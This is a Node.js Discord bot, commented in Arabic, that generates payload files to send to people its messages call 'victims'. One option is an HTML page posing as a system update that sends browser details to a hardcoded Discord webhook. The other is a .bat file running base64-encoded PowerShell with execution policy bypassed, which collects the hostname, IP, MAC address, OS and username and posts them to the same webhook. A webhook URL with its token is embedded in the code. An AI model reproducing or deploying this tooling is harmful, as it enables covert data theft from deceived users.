const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const fs = require('fs');
const path = require('path');

// --- إعدادات البوت ---
const TOKEN = 'ضع_التوكن_هنا'; // ضع توكن البوت هنا
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1574869870695157880/jDx4MINBoVjFp9Yr7_ulaIwuKPTZPIGAdXiQzPNUF8vf5WdhOvtMDx5InPhZXMGiBApP'; // ويب هوك لاستقبال البيانات من الضحايا

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
});

// قاعدة بيانات الضحايا
let victims = [];

client.once('ready', () => {
    console.log(`✅ ${client.user.tag} متصل`);
    client.user.setPresence({
        status: 'online',
        activity: { name: `🔍 | ${victims.length} ضحية`, type: 'WATCHING' }
    });
});

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    
    const args = message.content.trim().split(' ');
    const command = args[0].toLowerCase();
    
    switch(command) {
        case '!gen':
            generatePayload(message, args[1]);
            break;
            
        case '!list':
            listVictims(message);
            break;
            
        case '!clear':
            clearVictims(message);
            break;
            
        case '!stats':
            showStats(message);
            break;
            
        case '!help':
            showHelp(message);
            break;
            
        default:
            if (command === '!scan') {
                scanSimulation(message);
            }
    }
});

// دالة توليد ملف التلغيم (Payload)
async function generatePayload(message, type = 'pc') {
    try {
        let payloadCode = '';
        let fileName = '';
        let description = '';

        if (type === 'mobile' || type === 'mob') {
            // كود HTML + JavaScript للجوال
            payloadCode = `
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث النظام</title>
    <style>
        body { background-color: #e9ecef; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); text-align: center; width: 80%; max-width: 300px; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 10px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { color: #666; font-size: 14px; }
    </style>
</head>
<body>
    <div class="card">
        <h3>جاري التحديث...</h3>
        <div class="spinner"></div>
        <p>يرجى الانتظار</p>
    </div>
    <script>
        async function sendInfo() {
            const ua = navigator.userAgent;
            const info = {
                "UserAgent": ua,
                "Screen": screen.width + "x" + screen.height,
                "Language": navigator.language,
                "Platform": navigator.platform,
                "Time": new Date().toISOString()
            };
            
            fetch('${WEBHOOK_URL}', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ content: "📱 **ضحية جوال جديدة!**", embeds: [{ title: "معلومات الجهاز", description: \`**المستخدم**: \${ua}\n**الشاشة**: \${info.Screen}\n**اللغة**: \${info.Language}\` }] })
            });
        }
        sendInfo();
    </script>
</body>
</html>`;
            fileName = `mobile_payload_${Date.now()}.html`;
            description = 'تم توليد ملف الجوال. أرسل الملف للضحية ليتم فتحه في متصفحهم.';
        } else {
            // كود PowerShell للكمبيوتر
            payloadCode = `
$computerSystem = Get-CimInstance -ClassName Win32_ComputerSystem
$osInfo = Get-CimInstance -ClassName Win32_OperatingSystem
$cpuInfo = Get-CimInstance -ClassName Win32_Processor
$macAddress = Get-NetAdapter | Select-Object -First 1 | Select-Object MacAddress

$payload = @{
    "Hostname" = $computerSystem.Name
    "IP" = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1 | Select-Object -ExpandProperty IPV4Address).IPAddressToString
    "OS" = "$($osInfo.Caption) $($osInfo.Version)"
    "CPU" = $cpuInfo.Name
    "MAC" = $macAddress.MacAddress
    "User" = $env:USERNAME
    "Time" = (Get-Date).ToString()
}

$jsonPayload = ConvertTo-Json $payload

Invoke-RestMethod -Uri "${WEBHOOK_URL}" -Method Post -Body $jsonPayload -ContentType "application/json"
`;
            const utf8Bytes = Buffer.from(payloadCode);
            const base64Payload = utf8Bytes.toString('base64');
            payloadCode = `powershell.exe -ExecutionPolicy Bypass -EncodedCommand ${base64Payload}`;
            fileName = `payload_${Date.now()}.bat`;
            description = 'تم توليد ملف الكمبيوتر. انقل الملف للضحية وافتحه.';
        }

        const filePath = path.join(__dirname, fileName);
        fs.writeFileSync(filePath, payloadCode, 'utf8');

        const embed = new EmbedBuilder()
            .setTitle(type === 'mobile' ? '📱 ملف الجوال جاهز' : '💻 ملف الكمبيوتر جاهز')
            .setDescription(description)
            .setColor('#00ff00')
            .setFooter({ text: 'انقل الملف للضحية وافتحه' });

        await message.channel.send({ embeds: [embed], files: [{ attachment: filePath, name: fileName }] });

        setTimeout(() => {
            fs.unlinkSync(filePath);
        }, 60000);

    } catch (error) {
        console.error(error);
        message.reply('❌ حدث خطأ أثناء توليد الملف.');
    }
}

// عرض قائمة الضحايا
function listVictims(message) {
    if (victims.length === 0) {
        return message.channel.send('لا توجد ضحايا حالياً.');
    }
    
    const embed = new EmbedBuilder()
        .setTitle('📋 قائمة الضحايا')
        .setDescription(victims.map((v, i) => `${i+1}. **${v.hostname || v.UserAgent || 'غير معروف'}** (${v.ip || v.Screen || 'N/A'})`).join('\n'))
        .setColor('#ffff00');
        
    message.channel.send({ embeds: [embed] });
}

// مسح جميع الضحايا
function clearVictims(message) {
    victims = [];
    message.channel.send('✅ تم مسح جميع الضحايا.');
}

// إحصائيات
function showStats(message) {
    const embed = new EmbedBuilder()
        .setTitle('📊 الإحصائيات')
        .addFields(
            { name: 'عدد الضحايا', value: victims.length.toString(), inline: true },
            { name: 'الوقت', value: new Date().toLocaleString(), inline: true },
            { name: 'الحالة', value: '✅ نشط', inline: true }
        )
        .setColor('#00aaff');
        
    message.channel.send({ embeds: [embed] });
}

// مساعدة
function showHelp(message) {
    const embed = new EmbedBuilder()
        .setTitle('❓ الأوامر المتاحة')
        .setDescription(`
**!gen pc** - توليد ملف الكمبيوتر
**!gen mobile** - توليد ملف الجوال
**!list** - عرض قائمة الضحايا
**!clear** - مسح جميع الضحايا
**!stats** - عرض الإحصائيات
**!help** - عرض المساعدة
        `)
        .setColor('#00aaff');
        
    message.channel.send({ embeds: [embed] });
}

// محاكاة فحص الجهاز
function scanSimulation(message) {
    const embed = new EmbedBuilder()
        .setTitle('🔍 فحص الجهاز')
        .addFields(
            { name: 'اسم الجهاز', value: 'PC-USER01', inline: true },
            { name: 'نظام التشغيل', value: 'Windows 11 Pro', inline: true },
            { name: 'العنوان IP', value: '192.168.1.' + Math.floor(Math.random() * 255), inline: true },
            { name: 'الحالة', value: '✅ متصل', inline: false }
        )
        .setColor('#00ff00');
    
    message.channel.send({ embeds: [embed] });
}

client.login(TOKEN);